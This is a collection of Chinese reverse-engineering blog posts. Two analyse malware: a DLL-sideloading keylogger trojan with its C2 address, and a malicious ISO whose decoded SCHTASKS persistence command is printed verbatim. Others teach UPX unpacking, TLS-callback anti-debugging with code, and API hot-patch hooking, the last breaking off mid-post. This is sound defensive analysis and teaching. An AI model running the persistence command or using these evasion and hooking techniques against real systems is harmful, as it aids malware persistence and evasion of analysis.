[{"id":"d8609f7faf5edcbbc1a1648becebe73e","title":"某白加黑木马样本分析","content":"一、概述样本基本信息（4个文件）样本名称：a5c0Lm.exe、ClassicExplorer32.dll、ffff.pol、ffff.lop\nMD5：ae105528a6c5758ccf18705a8c208a97、7166253c768c66f0c3f75f4490d7dca8、9a726d190f558dfdefea623e521dedeb、55cf7b579e38d963f0534f4e03e35a08\n主要行为a5c0Lm.exe拥有Ivaylo Beltchev白签名，程序运行后，会加载同目录下的ClassicExplorer32.dll，调用其导出函数ShowExplorerSettings向当前进程注入shellcode，然后读取同目录下的ffff.pol并解密出 dll程序，该dll程序首先会备份4个文件，利用com组件接口设置计划任务以进行持久性操作，然后继续读取同目录下的ffff.lop并解密出 dll程序并调用其导出函数Edge，进行删除原始文件、查询杀毒&#x2F;调试软件是否存在并关闭、打印运行信息、从47.242.80.168下载新payload并执行命令、记录用户键盘操作并发送给攻击者、发送请求获取新的c2服务器地址、设置注册表实现开机自启动、安装名为Sauron的服务以实现持久化操作等。\n二、样本行为分析a5c0Lm.exe该样本主要功能是获取用户名，并创建名称为用户名的互斥体，然后加载同目录下的ClassicExplorer32.dll，并调用其导出函数ShowExplorerSettings进行相关操作\n\nClassicExplorer32.dll向当前进程注入shellcode该样本导出函数ShowExplorerSettings开始执行后，首先会向当前进程注入shellcode，然后通过CreateRemoteThread创建远程线程执行注入的shellcode\n\n执行shellcodeshellcode首先通过函数名和函数hash获取指定函数\n\n然后加载ffff.pol文件进内存，并通过异或等方式解密pe文件头\n\n接着依次复制头数据和节表数据、重定位pe文件、构建导入表等，然后执行载入内存中的PE文件（解密后的ffff.pol），调用其入口函数\n\n\nffff.pol入口函数入口函数主要是调用DllMain函数\n\nDllMain函数函数开始会查询并创建互斥体{A30BD1B1-CB43-4604-86F5-56594AEE26A3}以防止进程多开，接着解析命令行参数，然后创建新线程，并将参数传递给线程函数\n\n\n新线程在新线程函数中，首先会检查当前登录用户是否具有管理员权限，若是，则设置注册表项降低UAC提示强度，并创建子线程检测是否存在调试软件&#x2F;杀毒软件\n\n然后依次读取当前进程所在文件夹下的a5c0Lm.ex、ClassicExplorer32.dll、ffff.pol、ffff.lop进内存\n\n然后设置死循环，不断备份已读入内存的4个文件，然后利用com组件接口设置计划任务保证样本一直在运行，以进行持久性操作\n\n\n生成随机字符串\n\n复制文件\n\n\n创建计划任务\n\n加载ffff.lop并执行创建完新线程后，继续读取同目录下的ffff.lop进内存，然后对其进行解密还原成pe文件\n\n然后申请出一块空间用于存储该文件加载到内存后展开的数据，依次进行拷贝文件头数据、复制节表数据、进行重定位、构建导入表、设置内存保护属性等操作\n\nPE文件加载完成后，会调用其入口函数，若入口函数返回true，则查找并调用其导出函数Edge\n\nffff.lop入口函数入口函数主要是调用DllMain函数返回1，此时其导出函数Edge将会被执行\n\n导出函数Edge入口函数返回1后，其导出函数Edge就会被执行，其主要功能如下：\n首先对原文件进行删除和修改文件属性等\n\n然后创建多个线程，查询杀毒&#x2F;调试软件是否存在并关闭、打印运行信息、执行命令、从47.242.80.168下载新payload并执行命令等\n\n\n记录用户键盘操作和输入桌面内容并保存至文件，随后发送给攻击者\n\n\n发送请求获取新的c2服务器地址\n\n设置注册表实现开机自启动\n\n安装名为Sauron的服务以实现持久化操作\n\n三、结论该样本为恶意程序逃逸对抗模块、恶意程序下载模块与键盘记录器模块，样本拥有Ivaylo Beltchev白签名躲避查杀，程序运行后，会依次加载并执行同目录下的dll文件，利用com组件接口设置计划任务保证样本一直处于运行状态，删除原始文件、查询杀毒&#x2F;调试软件是否存在并关闭、打印运行信息、从47.242.80.168下载新payload并执行命令、记录用户键盘操作并发送给攻击者、发送请求获取新的C2服务器地址、设置注册表实现开机自启动、安装名为Sauron的服务以实现持久化操作等。\n","slug":"某白加黑木马样本分析","date":"2025-05-28T05:39:13.000Z","categories_index":"","tags_index":"恶意样本,白加黑技术,逆向","author_index":"0netry"},{"id":"0fa9719b9833354b768a1db954a5b0e7","title":"恶意iso文件分析","content":"iso信息文件信息\n文件内容\ndoc文档doc加密数据\nWinWord.exe即Concept Note Strategic Dialog Version 30.1.docx.exe\n签名信息\n详细信息\n运行运行Concept Note Strategic Dialog Version 30.1.docx.exe\n加载当前目录下的MSVCR100.dll\n使用process monitor监控\n\n使用Dependency walker监控\n\n创建注册表项dll创建的\n\n\n该项主要是通过powershell启动MSBild.exe运行解密出的project xml文件。dll创建的\n\n创建定时任务dll创建的\n1SCHTASKS /CREATE /f /TN &quot;Health Check&quot; /TR &quot;shutdown /l /f&quot; /SC WEEKLY /d WED,FRI /ST 13:15\n\n每周三和周五13:15强行关闭应用程序并注销当前用户;\n最后创建名为“Health Check”的计划任务，在每周三、周五的13：15分启动，其操作为注销电脑，从而触发注册表winlogon项，以此实现驻留\n\nMSVCR100.dllMSVCR100.dll信息\n第一个功能函数查找iso解压目录中隐藏的以~开头的doc诱饵文件，并与0xCA进行异或解密\n\n解密得到xml文件\n\n保存到临时文件夹的临时文件wct1FDA.tmp中\n\n解密启动winword打开诱饵文档的命令\n\n创建进程执行启动windword打开诱饵文档命令\n\n第二个功能函数\n\n\n\n%TEMP%&#x2F;&#x2F;wct1FDA.tmp\n\n环境变量以加密方式存储在加载程序的数据部分内，并且 XOR 解密密钥（“0xa7”）在执行期间静态地用于执行解密。\n\n\n解密计划任务命令（xor 0xA7）\n\n\n\n创建进程启动定时任务\n1rdx=00000000003ED3F0 L&quot;SCHTASKS /CREATE /f /TN \\&quot;Health Check\\&quot; /TR \\&quot;shutdown /l /f\\&quot; /SC WEEKLY /d WED,FRI /ST 13:15&quot;\n\n\n附录iso：\n\nSHA256: 205f6808ab05ff3932ee799f37c227a7a950e07ea97f51d206e0563c83592e60\nMD5: 836184b7387b212f8b7f064d5e60f587\nSHA1: fcefbe984fa0e343ec51cb22b6119014a6b1ee36\n\n参考链接Schtasks（计划任务）命令详解-转载\nwindows系统shutdown命令大全详解\n浅谈powershell\n","slug":"恶意iso文件分析","date":"2023-04-08T02:22:11.000Z","categories_index":"","tags_index":"恶意样本,逆向,iso文件","author_index":"0netry"},{"id":"d804751ae060ee6bddee780d4be7bc78","title":"UPX脱壳实战——结合逆向工程核心原理","content":"用《逆向工程核心原理》这本书中的notepad_upx.exe来实验\n未加壳的oep\n单步跟踪法脱壳的方法有很多，先来讲脱壳方法中最基础的单步跟踪法。单步跟踪法就是利用OD的单条指令执行功能，从壳的入口一直执行到OEP，最终通过这个OEP将原程序dump出来。在单步跟踪的时候需要跳过一些不能执行到的指令。\n12345678　　使用单步跟踪法追踪OEP的常见步骤：　　1、用OD载入待脱壳文件，如果出现压缩提示，选择“不分析代码”；　　2、向下单步跟踪，实现向下的跳转；　　3、遇到程序往上跳转的时候（包括循环），在回跳的下一句代码上单击并按键盘上的“F4”键跳过回跳指令；　　4、OD中的绿色线条表示跳转没有实理，不必理会，红色线条表示跳转已经实现；　　5、如果刚载入程序的时候，在附近有一个CALL指令，那么就要按键盘上的“F7”键跟进这个CALL内，不然程序很容易运行起来；　　6、在跟踪的时候，如果执行某个CALL指令后就运行，一定要按键盘上的“F7”键进入这个CALL之内再单步跟踪；　　7、遇到在popad指令下的远转移指令时，要格处注意，因为这个远转移指令的目的地很可能就是OEP。\n\n用x32dbg打开加壳程序，会断在pushad指令处\n\n单步运行（step over），当遇到jcc&#x2F;loop指令时，要判断他是往下跳还是往上跳，如果为往下跳，直接跳过去就可以（直接单步运行），但是如果是往上跳，可能会有循环等结构，比较的麻烦，需要利用断点的方式来避免往上跳的情况，这里需要注意，如果遇到jump指令向上时，不能简单的用这一招，需要结合整个jump指令的范围内的jcc来决定，如下所示：\n1.当运行到01015359处的jcc指令时，该指令是往上跳的(从01015359跳到01015348)，这时就在01015359处的下一条指令也就是0101535B处断点然后继续运行来跳过，然后继续单步运行\n\n2.当遇到向上跳的jmp指令时，不能只简单用上面的方法，首先在jmp的后一条指令打断点，然后需要回溯跳转范围内的jcc指令，看有没有跳转到jmp指令后面的，若有则在跳转地址打断点，然后再点运行，如下图中只有1015402和10153EC两处在jmp指令后，在这两处打断点，然后点击运行\n\n3.经过上一步运行后，断点会停在10153EC处\n\n4.继续向下单步，发现其被包含在一个jmp(10153FD)的跳转范围内，则去掉此处的断点，利用2中的处理方法继续设断点，发现只有1015402在10153FD之后，在1015402设置断点，然后点运行\n\n5.此时断点会停在1015402处，继续单步运行，后面会再次遇到jmp（1015476）指令，此时只有1015478符合设断点的条件，但是1015478是个call指令，不宜只设此处一个断点，（有可能此处的call是退出程序的函数。我调试是用od会显示此处是exitprocess函数），所以此时需要看看跳转范围里的jcc，看是否有跳转到范围以上的（即地址小于1015459的），发现有个跳到101543C的\n\n6.回溯101543C，发现其有跳转到jmp（1015476）指令之后的101547E，在101547E处设置断点，然后点运行\n\n7.此时断点停在101547E处，继续单步运行，就看到了popad指令，这也是马上到oep的标志，继续单步运行，发现有个jmp指令（10154BB），但是此时没有向上或向下的箭头，这是因为这是一个大跳转，而这个大跳转的地址就极大可能是oep地址（如下图中的100739D）\n\n\n8.继续单步运行，程序就会跳转到100739D地址处，此处便是oep，可以看和前面未加壳的oep一致\n\nESP定律ESP定律的原理在于程序中堆栈平衡的合理利用。由于在程序自解密或者自解压过程中，不少壳会先将当前寄存器内容压栈，如使用pushad，在解压结束后，会将之前的寄存器值出栈，如使用popad。因此在寄存器出栈时，往往程序代码被自动恢复，此时硬件断点触发。然后在程序当前位置，只需要少许单步跟踪，就很容易到达正确的OEP位置。\n123456　ESP定律法是脱壳的利器，是国外友人发现的。有了ESP定律，可以方便我们脱掉大多数的压缩壳。可谓是本世纪破解界中最伟大的发现之一。这里只简单的看一下狭义ESP定律的原理。　　使用ESP定律追踪OEP的常见步骤：　　1、将待脱壳程序载入到OD中，开始就按键盘上的“F8”键单步跟踪一步，这时如果看到OD右边的寄存器窗口中的ESP寄存器的值有没有变为红色，如果发现ESP寄存器的值变为红色，执行第2步；　　2、在OD的命令行窗口中执行命令hrXXXXXXXX,xxxxxxxx就是变为红色的ESP寄存器的值，在输入命令之后，一定不要忘记按键盘上的回车键；　　3、按键盘上的“F9”键让程序运行起来；　　4、使用单步跟踪的方法跟踪到OEP即可。\n\n1.用x32dbg打开加壳程序，将会暂停在pushad指令处\n\n2.单步运行一次，此时8大寄存器只有esp发生了改变（只有esp为红色），此时右键esp，并选择在内存窗口中跟随\n\n3.此时内存窗口就会转到esp所指的地址，选中前四字节，然后右键-&gt;断点-&gt;硬件访问-&gt;4字节(D)来设置硬件断点\n\n4.设置完硬件断点后，直接运行，断点将会停在跳转oep的指令附近，就看到了popad指令，这也是马上到oep的标志，继续单步运行，发现有个jmp指令（10154BB），但是此时没有向上或向下的箭头，这是因为这是一个大跳转，而这个大跳转的地址就极大可能是oep地址（如下图中的100739D）\n\n5.继续单步运行，程序就会跳转到100739D地址处，此处便是oep，可以看和前面未加壳的oep一致\n\n二次断点法（内存镜像法）二次断点是有技巧的下两个断点，在两个断点之后就可以很轻松的找到OEP。\n（ 不是每个都可以的，一些像UPX和ASPACK就不行。）\n壳如果要把原来加密或压缩的代码运行起来就必须要解压和解密原来的代码。这一个过程可以将他看做是对代码段（code段）的写入，一个EXE文件的有code段，data段，rsrc段…..依次排列在你的内存空间中，只要你在data断或者rsrc段下内存访问断点，那么中断的时候code段就已经解压完毕了。这时我们再对code段下内存访问断点，不就可以到达OEP了吗？ 1.对data段下内存访问断点而中断是因为内存写入中断，目的是断在对对data段的解压时，这时壳要对data段写数据，但是code段已经解压 完毕。\n2.对code段下内存访问断点而中断是因为内存执行中断，目的当然就是寻找OEP了\n123456　　使用二次断点法追踪OEP的常见步骤：　　1、将待脱壳程序载入到OD中，单击OD的“选项”菜单下的“调试设置”命令，在弹出的“调试选项”对话框中切换到“异常”选项卡，勾选该选项卡下的所有复选框，也就是忽略所有异常；　　2、按键盘上的“ALT+M”组合键打开OD的内存窗口；　　3、在OD的内存窗口中找到“.rsrc”区段，单击该区段后按键盘上的“F2”键在该区段上下一断点；　　4、按“Shift+F9”让程序运行到断点心处，而后再次打开OD的内存窗口，这次在“.rsrc”区段上面的“.code”区段（有的时候就是“.text”）上下一个断点；　　5、按“shift+F9”让程序运行到第二次下的断点处，然后单步跟踪既可以来到OEP。\n\n首先设置忽略所有异常\n\n然后在内存窗口找到资源段（data段&#x2F;rsrc段）下断点，按“Shift+F9”让程序运行到断点处\n\n接着在内存窗口“.code”区段（有的时候就是“.text”）上下一个断点，按“Shift+F9”让程序运行到断点处，然后单步跟踪既可以来到OEP。\n\nx32dbg结合自带的scylla进行脱壳与修复找到oep后，就可以用x32dbg结合自带的scylla插件进行脱壳和修复iat了，具体步骤如下：\n①首先打开scylla插件，并点击dump按钮保存脱壳后的程序\n\n②然后点击IAT Autosearch,遇到result of advanced…..直接点击是\n\n③若弹框iat found说明找到了程序的IAT表，点击确定\n\n④点击Get imports就会在上面显示找到的导入表\n\n如果有一个表没有导出成功，，如下图所示：\n\n直接右键删除这个导出失败的表，然后点击Fix Dump进行修复\n修复完后可以看到文件夹下多了两个程序，第二个是导出但没有修复IAT的程序，第三个是基于导出的源程序修复好了IAT。双击是可以直接运行的。\n\n使用lordpe+importREC脱壳及修复在od找到oep后，使用ollydump脱壳并用importREC修复后程序不能运行，用lordpe修复pe还是不能运行，此时可以选择不使用ollydump脱壳，而是用lordpe脱壳并用importREC，具体操作示例如下：\n1.使用od找到oep后，记录下oep地址，如下找到的oep地址是0100739D\n\n2.双击运行待脱壳程序，以管理员身份打开lordpe，并选择待脱壳程序右键选择完整转存，如下示例待脱壳程序是notepad_u…\n\n3.用lordpe dump文件后，以管理员身份打开importREC，选择待脱壳程序，本例中为notepad_upx.exe\n\n4.点击IAT AutoSearch，如果出现如下提示表示找到了IAT，点击确定即可\n\n5.若找到IAT，接着点击Get Imports获取输入表，如下图获取到了输入表，但是有个显示了?，且后面有valid：No，表示有无效输入表\n\n6.点击Show Invalid选择失效的输入表，右键选择Invalidate functions，然后再右键选择Trace Level1(Disasm)，接着再选择Show Invalid；若还有，则继续右键选择Trace Level2(Hook)，接着再选择Show Invalid；若还有，继续右键选择Trace Level3(Trap Flag)，接着再选择Show Invalid；若还有，则右键选择Delete thunk(s)删除无效的输入表，接着再选择Show Invalid，可以发现没有无效输入表了\n\n\n7.紧接着将oep修改为od中查找的oep，填偏移量即0000739D，然后选择Fix Dump按钮，再弹出文件框选择之前lordpe dump的文件\n\n8.修复成功后提示生成新的文件，文件名以_结尾，如本例中为notepad_upx_dumped_.exe，双击运行修复后的文件可以正常运行，用od打开修复后的文件发现直接是oep，已没有壳\n\n参考链接CTF中手工脱壳实例(UPX壳)\n脱壳后软件无法运行的原因分析及对策——写给初学者\n用importREC修复Import表\n逆向常用小工具（一）——importREC\n对于UPX壳的脱壳问题\nximo脱壳1—手脱UPX壳 \n脱壳入门初级教学 \n脱壳方法总汇\n逆向基础——软件手动脱壳技术入门\nhttps://www.cnblogs.com/LyShark/p/11190029.html\nhttps://yangtf.gitee.io/ctf-wiki/reverse/unpack/packer-introduction/\n普通壳的脱壳方法和脱壳技巧，叫新手少走弯路！\n","slug":"UPX脱壳实战——结合逆向工程核心原理","date":"2022-05-11T03:23:55.000Z","categories_index":"","tags_index":"逆向工程核心原理,加壳与脱壳,iat修复","author_index":"0netry"},{"id":"66da80b7dfd28e13d279b8154dbcb5eb","title":"TLS回调函数","content":"TLS回调函数TLS（Thread Local Storage，线程局部存储）回调函数常用于反调试\nTLSTLS是各线程的独立的数据存储空间。使用TLS技术可在线程内部独立使用或修改进程的全局数据或静态数据，就像对待自身的局部变量一样（编程中这种功能非常有用）。\nTLS表若在编程中启用了TLS功能，PE头文件中就会设置TLS表（TLS Table）项目，如下图（IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]），IMAGE_TLS_DIRECTORY结构体就位于RVA 9310地址处\n\nIMAGE_TLS_DIRECTORY1234567891011121314151617181920212223242526272829IMAGE_TLS_DIRECTORY结构体：typedef struct _IMAGE_TLS_DIRECTORY64&#123;\tULONGLONG StartAddressOfRawData;\tULONGLONG EndAddressOfRawData;\tULONGLONG AddressOfIndex;                   // PDWORD\tULONGLONG AddressOfCallBacks;               // PIMAGE_TLS_CALLBACK *;\tDWORD SizeOfZeroFill;\tDWORD Characteristics;&#125;IMAGE_TLS_DIRECTORY64;typedef IMAGE_TLS_DIRECTORY64 * PIMAGE_TLS_DIRECTORY64;typedef struct _IMAGE_TLS_DIRECTORY32&#123;\tDWORD StartAddressOfRawData;\tDWORD EndAddressOfRawData;\tDWORD AddressOfIndex;                       // PDWORD\tDWORD AddressOfCallBacks;                   // PIMAGE_TLS_CALLBACK *;\tDWORD SizeOfZeroFill;\tDWORD Characteristics;&#125;IMAGE_TLS_DIRECTORY32;typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;#ifdef _WIN64typedef IMAGE_TLS_DIRECTORY64 IMAGE_TLS_DIRECTORY;typedef PIMAGE_TLS_DIRECTORY64 PIMAGE_TLS_DIRECTORY;#elsetypedef IMAGE_TLS_DIRECTORY32 IMAGE_TLS_DIRECTORY;typedef PIMAGE_TLS_DIRECTORY32 PIMAGE_TLS_DIRECTORY;#endif\n\n使用ExeInfoPe查看IMAGE_TLS_DIRECTORY结构体：\n\n逆向分析中比较重要的成员为AddressOfCallBacks，该值指向含有TLS回调函数地址（VA）的数组。这意味着可以向同一程序注册多个TLS回调函数（数组以NULL值结束）。\n回调函数地址数组该数组中实际存储的就是TLS回调函数的地址。进程启动运行时，（执行EP代码前）系统会逐一调用存储在该数组中的函数。请注意，可以通过修改程序注册多个TLS函数。\n下面使用ExeInfoPe查看回调函数地址数组（由前面已知示例程序回调函数地址为408114），可以看到示例中只注册了一个TLS函数（地址为401000）\n\nTLS回调函数所谓TLS回调函数是指，每当创建&#x2F;终止进程的线程时会自动调用执行的函数。有意思的是，创建进程的主线程时也会自动调用回调函数，且其调用执行先于EP代码。反调试技术利用的就是TLS回调函数的这一特征。\n请注意，创建或终止某线程时，TLS回调函数都会自动调用执行，前后共2次（原意即为此）。执行进程的主线程（运行进程的EP代码）前，TLS回调函数会先被调用执行，许多逆向分析人员将该特征应用于程序的反调试技术。\nIMAGE_TLS_CALLBACK1234567TLS Callback函数定义typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK)(    PVOID DllHandle,    DWORD Reason,    PVOID Reserved);\n\n它与DllMain函数定义相似\n1234567DllMain函数定义BOOL WINAPI DllMain(    __in HINSTANCE hinstDLL,    __in DWORD fdwReason,    __in LPVOID lpvReserved);\n\n观察以上两个函数，发现它们的参数顺序与含义是一样的。其中，参数DllHandle为模块句柄（即加载地址），参数Reason表示调用TLS回调函数的原因，具体原因有四种：\n1234#define DLL_PROCESS_ATTACH 1#define DLL_THREAD_ATTACH  2#define DLL_THREAD_DETACH  3#define DLL_PROCESS_DETACH 0\n\nDLL_PROCESS_ATTACH进程的主线程调用main()函数前，已经注册的TLS回调函数（TLS_CALLBACK1、TLS_CALLBACK2）会先被调用执行，此时Reason的值为1（DLL_PROCESS_ATTACH）\nDLL_THREAD_ATTACH所有TLS回调函数完成调用后，main()函数开始调用执行，创建用户线程（ThreadProc）前，TLS回调函数会被再次调用执行，此时Reason&#x3D;2（DLL_THREAD_ATTACH）\nDLL_THREAD_DETACHTLS回调函数全部执行完毕后，ThreadProc()线程函数开始调用执行。其执行完毕后Reason&#x3D;3（DLL_THREAD_DETACH），TLS回调函数被调用执行。\nDLL_PROCESS_DETACHThreadProc()线程函数执行完毕后，一直在等待线程终止的main()函数（主线程）也会终止。此时Reason&#x3D;0（DLL_PROCESS_DETACH），TLS回调函数最后一次被调用执行。\n练习：TlsTest.exe1.TlsTest.cpp\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;windows.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)void print_console(char* szMsg)&#123;    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);    WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);&#125;void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123;    char szMsg[80] = &#123;0,&#125;;    wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason);    print_console(szMsg);&#125;void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123;    char szMsg[80] = &#123;0,&#125;;    wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason);    print_console(szMsg);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;)    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;#pragma data_seg()DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    print_console(&quot;ThreadProc() start\\n&quot;);    print_console(&quot;ThreadProc() end\\n&quot;);    return 0;&#125;int main(void)&#123;    HANDLE hThread = NULL;    print_console(&quot;main() start\\n&quot;);    hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);    WaitForSingleObject(hThread, 60*1000);    CloseHandle(hThread);    print_console(&quot;main() end\\n&quot;);    return 0;&#125;\n\n以上TlsTest.cpp源代码中注册了2个TLS回调函数（TLS_CALLBACK1、TLS_CALLBACK2），功能是将DllHandle与Reason这两个参数的值输出到控制台，然后终止退出。main()函数用于创建用户线程（ThreadProc）后终止，main()与ThreadProc()内部分别将函数开始&#x2F;终止日志输出到控制台\n2.通过ExeInfoPe查看TlsTest.exe的回调函数地址数组，可以看到注册了两个回调函数（401000、401080）\n\n3.运行TlsTest.exe结果\n\n调试TLS回调函数若直接使用调试器打开带有TLS回调函数的程序，则无法调试TLS回调函数，因为TLS回调函数在EP代码之前就被调用执行了。此时修改调试器选项就可以调试TLS回调函数（见下图），然后重启调试器重新调试程序，调试器就会停在ntdll.dll模块内部的”System Startup Breakpoint”处暂停。调试器暂停的位置即是系统启动断点，使用ExeInfoPe查看的回调函数的地址，然后在回调函数的起始地址设置好断点，这样就可以调试TLS回调函数了。\n\n手动添加TLS回调函数下面以Hello.exe为例展示手动添加TLS回调函数使之能起到反调试的作用\n1.修改前的原程序如下图所示，修改前的原程序用x32dbg调试运行时也没有反调试功能，而是直接输出Hello:)\n\n2.设计规划首先要确定IMAGE_TLS_DIRECTORY结构体与TLS回调函数放到文件的哪个位置。向某个PE文件添加代码或数据时，有如下三种方法来查找合适的位置：\n1231）添加到节区末尾的空白区域2）增加最后一个节区的大小3）在最后添加新节区\n\n本例中采用第二种方法，即增加最后一个节区的大小。\n增加最后一个节区的大小①首先使用exeinfope查看Hello.exe最后一个节区（.rsrc）的节区头（注意，Hello.exe的Section Alignment&#x3D;1000h，File Alignment&#x3D;200h），可以看到最后一个节区（.rsrc）的Pointer to Raw Data&#x3D;9000h，Size of Raw Data&#x3D;200h。所以PE头定义的文件整体大小为9200h。考虑到要添加代码与数据的大小，将最后一个节区的大小增加200h（文件的大小增加到9400h）。\n\n\n\n\n\n\n\n\n\n\n图中Virtual Size为1B4，PE装载器会按照Section Alignment值对齐该值，即加载到内存中的大小为1000.所以将节区的文件大小增加200后，实际Virtual Size值变为3B4，它比加载到内存中的尺寸1000要小，所以不需要再单独增大Virtual Size的值。\n②使用010Editor（或HxD工具）打开Hello.exe文件，移动光标至最后位置，在菜单栏中选择Edit-&gt;Insert&#x2F;Overwrite-&gt;Insert Bytes，然后在弹框中选择Hex以显示16进制，向Size中输入200，单击Insert后，即从光标的当前位置新添加了200h个字节（即512个字节）\n\n\n\n\n3.编辑PE文件头.rsrc节区头使用010Editor修改.rsrc节区头中的Size Of Raw Data与Characteristics的值，即Size of Raw Data&#x3D;400h、Characteristics增加IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE属性（Characteristics&#x3D;E0000060）\n\n\n\n\n\n\n\n\n\n由于需要在扩展区域内创建IMAGE_TLS_DIRECTORY结构体与TLS回调函数，所以需要向该节区添加IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE属性。此外，还必须向包含IMAGE_TLS_DIRECTORY结构体的节区添加IMAGE_SCN_MEM_WRITE属性，才能保证正常运行。\n\n\nIMAGE_DATA_DIRECTORY[9]接下来要设置TLS表（IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]）的值，根据前面的步骤，扩展区域的起始地址为9200h（文件偏移）。而原来.rsrs的起始地址为9000h，大小为200h，对应的RVA为C000h，所以9200h对应的RVA为9200h-9000h+C000h&#x3D;C200h。（计算公式RVA &#x3D; 目标文件偏移量 - 目标所在节区的起始偏移量 + 目标所在节区的起始 RVA，这里目标所在节区为.rsrc，通过010Editor可以查看该节区的起始偏移为9000h，起始RVA为C000h，所以9200h偏移对应的RVA&#x3D;9200h-9000h+C000h&#x3D;C200h，也可用Stud_PE的RVA&lt;&#x3D;&gt;RAW插件或Lord_PE的位置计算器来计算），接下来将从该地址处创建IMAGE_TLS_DIRECTORY结构体。因此在010Editor中修改IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]，使得RVA&#x3D;C200h，Size&#x3D;18h（TLS表大小为18h，即24）\n\n4.设置IMAGE_TLS_DIRECTORY接下来在文件偏移9200h（RVA C200）地址处设置IMAGE_TLS_DIRECTORY结构体，只要把TLS回调函数注册到其中即可。根据TLS表的结构\n12345678typedef struct _IMAGE_TLS_DIRECTORY32&#123;\tDWORD StartAddressOfRawData;\tDWORD EndAddressOfRawData;\tDWORD AddressOfIndex;                       // PDWORD\tDWORD AddressOfCallBacks;                   // PIMAGE_TLS_CALLBACK *;\tDWORD SizeOfZeroFill;\tDWORD Characteristics;&#125;IMAGE_TLS_DIRECTORY32;\n\n可以从图中（红色方框）看出设置了：\n123456StartAddressOfRawData=0040C218EndAddressOfRawData=0040C21CAddressOfIndex=0040C220                      AddressOfCallBacks=0040C224                   SizeOfZeroFill=00000000Characteristics=00000000\n\n而根据文件偏移9200h对应的RVA为C200h，ImageBase为400000h，所以TLS回调函数地址数组所在地址40C224h对应的RVA为40C224h-400000h&#x3D;C224h，对应的文件偏移&#x3D;C224h-C200h+9200h&#x3D;9224h，即黄色方框位置，注册了一个TLS回调函数40C230h\nTLS回调函数对应的文件偏移&#x3D;40C230h-400000h-C200h+9200h&#x3D;9230h（即蓝色方框位置），这里先向该地址写入”C2 0C00 - RETN 0C”命令，即在TLS回调函数中不执行任何操作，直接返回。\n到此运行修改后的Hello.exe，若修改没问题，则能正常运行\n\n\n\n\n\n\n\n\n\nTLS回调函数的返回指令不是RETN，而是RETN 0C指令，因为函数有3个参数（大小为0C），所以需要修正栈，修正大小为0C。\n\n\n\n\n\n\n\n\n\n\n我按上面步骤操作但最后运行时发现运行不了，经过一番研究，发现原来使用010Editer编辑二进制时，如果在改字节过程中使用了删除键，则pe的字节也会被删除，我在编辑过程中使用了删除键，所以导致最后.rsrc节区的大小没有400，而raw data size前面已经填了400h，导致不一致，所以无法运行，此时需要看缺了多少字节，重新插入缺少的字节即可。\n5.编写TLS回调函数根据前面步骤修改PE后程序能正常运行，接下来就可以编写TLS回调函数了。\n①使用x32dbg打开Hello.exe，然后跳转到TLS回调函数地址处（前面注册了TLS回调函数的地址为40C230），使用汇编功能编写代码\n\n②编写如下图所示的反调试代码，然后分别修改40C270、40C280处为”TLS CallBack”、”Debugger Detected!”\n\n\n\n\n\n\n\n\n\n1）代码流程是：\n通过比较[esp+8]即TLS回调函数第二个参数Reason的值是否为1（DLL_PROCESS_ATTACH），若是，则获取peb.BeingDebugged成员的值是否为0，若为0表示正常运行（非调试运行），若不为0，则表示处于调试状态，则弹出消息框提示”Debugger Detected!”然后退出程序。\n2）MessageBoxA()与ExitProcess() API的IAT地址（分别为4080E8、408028）使用原Hello.exe的IAT中的即可。在编写汇编过程中直接Call 地址，x32dbg会自动求得API的地址并输入结果。如果要调用的API不在IAT中，那么编写代码时要复杂得多。\n\n③编写完代码和数据后，使用快捷键Ctrl+p（或菜单栏选择文件-&gt;补丁），在弹出的对话框中全选并选择修复文件，然后输入要保存的文件名（*.exe）即可\n\n④使用x32dbg运行已保存的修改的程序，可以看到弹框显示”Debugger Detected!”，单击”确定”后，程序停止运行，这表明手工添加TLS回调函数成功。\n\n","slug":"TLS回调函数","date":"2022-04-01T07:23:02.000Z","categories_index":"","tags_index":"逆向,TLS回调函数,PE结构","author_index":"0netry"},{"id":"d3476856058b1cb70ed747b50ca39e21","title":"HotFix Hook","content":"API代码修改技术的问题对于全局API钩取——基于Win10的隐藏notepad.exe练习——stealth2.cpp——NewCreateProcessA()函数，其结构简单梳理为：\n123456NewCreateProcessA(...)&#123;\t//①脱钩\t//②调用原始API\t//③注入\t//④挂钩&#125;\n\n为正常调用原API，需要先①脱钩（若不脱钩，调用②原始API就会陷入无限循环）。然后在钩取函数返回前再次④钩取，使之进入钩取状态。\n也就是说，每当在程序内部调用CreateProcessA()函数时，NewCreateProcessA()就会被调用执行，不断重复脱钩&#x2F;挂钩。这种操作不仅会造成性能低下，更严重的是在多线程时会产生运行时错误，这是由脱钩&#x2F;挂钩操作要对原API的前5个字节进行修改引起的。\n一个线程尝试运行某段代码时，若另一个线程正在对该段代码进行写操作，这时就会出现冲突，最终引发运行时错误。所以需要一种更安全的API钩取技术。\n热补丁（修改7个字节代码）\n\n\n\n\n\n\n\n\n热补丁对应的英文位Hot Patch或Hot 